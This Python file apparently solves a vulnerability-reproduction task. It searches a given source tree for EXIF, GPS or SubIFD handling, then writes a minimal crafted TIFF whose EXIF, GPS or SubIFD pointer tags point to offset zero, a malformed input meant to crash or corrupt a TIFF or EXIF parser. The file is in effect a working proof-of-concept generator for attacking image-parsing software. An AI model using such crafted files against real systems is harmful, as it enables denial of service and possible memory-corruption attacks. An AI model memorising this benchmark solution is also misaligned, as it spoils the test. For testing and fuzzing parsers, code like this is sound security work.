import os
import re
import tarfile
import struct
from typing import Iterable, List, Tuple, Optional


class Solution:
    def _iter_text_files_from_dir(self, root: str) -> Iterable[str]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".m", ".mm", ".rs", ".py", ".java", ".kt", ".go"}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    with open(path, "rb") as f:
                        data = f.read()
                    yield data.decode("utf-8", errors="ignore")
                except Exception:
                    continue

    def _iter_text_files_from_tar(self, tar_path: str) -> Iterable[str]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".m", ".mm", ".rs", ".py", ".java", ".kt", ".go"}
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    _, ext = os.path.splitext(name)
                    if ext.lower() not in exts:
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
        except Exception:
            return

    def _iter_texts(self, src_path: str) -> Iterable[str]:
        if os.path.isdir(src_path):
            yield from self._iter_text_files_from_dir(src_path)
        else:
            yield from self._iter_text_files_from_tar(src_path)

    def _source_has_any(self, src_path: str, tokens: List[str]) -> bool:
        toks = [t for t in tokens if t]
        if not toks:
            return False
        patterns = [re.compile(re.escape(t), re.IGNORECASE) for t in toks]
        for txt in self._iter_texts(src_path):
            for p in patterns:
                if p.search(txt):
                    return True
        return False

    def _pack_ifd_entry_le(self, tag: int, typ: int, count: int, value: int) -> bytes:
        return struct.pack("<HHI", tag, typ, count) + struct.pack("<I", value & 0xFFFFFFFF)

    def _pack_ifd_entry_short_le(self, tag: int, value_short: int) -> bytes:
        return struct.pack("<HHI", tag, 3, 1) + struct.pack("<H", value_short & 0xFFFF) + b"\x00\x00"

    def _build_tiff_with_offline_pointer_zero(self, offline_tags: List[int]) -> bytes:
        # Classic TIFF (little-endian): Header + IFD0 + 1 byte image data
        # Baseline tags for a minimal 1x1, 8-bit grayscale, uncompressed, 1 strip.
        entries: List[Tuple[int, bytes]] = []

        # ImageWidth (256) LONG
        entries.append((256, self._pack_ifd_entry_le(256, 4, 1, 1)))
        # ImageLength (257) LONG
        entries.append((257, self._pack_ifd_entry_le(257, 4, 1, 1)))
        # BitsPerSample (258) SHORT = 8
        entries.append((258, self._pack_ifd_entry_short_le(258, 8)))
        # Compression (259) SHORT = 1 (none)
        entries.append((259, self._pack_ifd_entry_short_le(259, 1)))
        # PhotometricInterpretation (262) SHORT = 1 (BlackIsZero)
        entries.append((262, self._pack_ifd_entry_short_le(262, 1)))
        # StripOffsets (273) LONG = placeholder, patched after entry count known
        entries.append((273, self._pack_ifd_entry_le(273, 4, 1, 0)))
        # SamplesPerPixel (277) SHORT = 1
        entries.append((277, self._pack_ifd_entry_short_le(277, 1)))
        # RowsPerStrip (278) LONG = 1
        entries.append((278, self._pack_ifd_entry_le(278, 4, 1, 1)))
        # StripByteCounts (279) LONG = 1
        entries.append((279, self._pack_ifd_entry_le(279, 4, 1, 1)))

        # Add candidate "offline pointer" tags with offset/value set to 0
        # (e.g., EXIFIFDPointer 34665, GPSIFDPointer 34853, SubIFDs 330)
        for tag in offline_tags:
            if tag in {256, 257, 258, 259, 262, 273, 277, 278, 279}:
                continue
            entries.append((tag, self._pack_ifd_entry_le(tag, 4, 1, 0)))

        entries.sort(key=lambda x: x[0])

        n = len(entries)
        ifd0_offset = 8
        data_offset = ifd0_offset + 2 + n * 12 + 4

        # Patch StripOffsets (273)
        patched_entries: List[bytes] = []
        for tag, b in entries:
            if tag == 273:
                patched_entries.append(self._pack_ifd_entry_le(273, 4, 1, data_offset))
            else:
                patched_entries.append(b)

        header = b"II" + struct.pack("<H", 42) + struct.pack("<I", ifd0_offset)
        ifd = struct.pack("<H", n) + b"".join(patched_entries) + struct.pack("<I", 0)
        image_data = b"\x00"

        return header + ifd + image_data

    def solve(self, src_path: str) -> bytes:
        exif_present = self._source_has_any(src_path, ["EXIF", "Exif", "0x8769", "34665", "EXIFIFD"])
        gps_present = self._source_has_any(src_path, ["GPS", "0x8825", "34853", "GPSIFD"])
        subifd_present = self._source_has_any(src_path, ["SubIFD", "SUBIFD", "0x014A", "0x14A"])

        offline_tags: List[int] = []
        if exif_present:
            offline_tags.append(34665)  # ExifIFDPointer
        if gps_present:
            offline_tags.append(34853)  # GPSIFDPointer
        if not offline_tags and subifd_present:
            offline_tags.append(330)  # SubIFDs

        if not offline_tags:
            offline_tags = [34665]

        return self._build_tiff_with_offline_pointer_zero(offline_tags)